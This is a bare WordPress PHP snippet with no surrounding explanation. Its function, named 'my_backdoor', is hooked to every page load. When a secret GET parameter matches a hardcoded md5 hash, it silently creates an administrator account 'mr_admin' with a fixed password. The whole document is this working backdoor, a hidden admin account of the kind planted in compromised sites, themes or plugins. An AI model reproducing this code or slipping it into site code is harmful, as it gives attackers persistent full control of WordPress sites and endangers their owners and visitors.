<?php


add_action( 'wp_head', 'my_backdoor' );


 


function my_backdoor() {


    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {


        require( 'wp-includes/registration.php' );


        if ( !username_exists( 'mr_admin' ) ) {


            $user_id = wp_create_user( 'mr_admin', 'pa55w0rd!' );


            $user = new WP_User( $user_id );


            $user->set_role( 'administrator' ); 


        }


    }


}

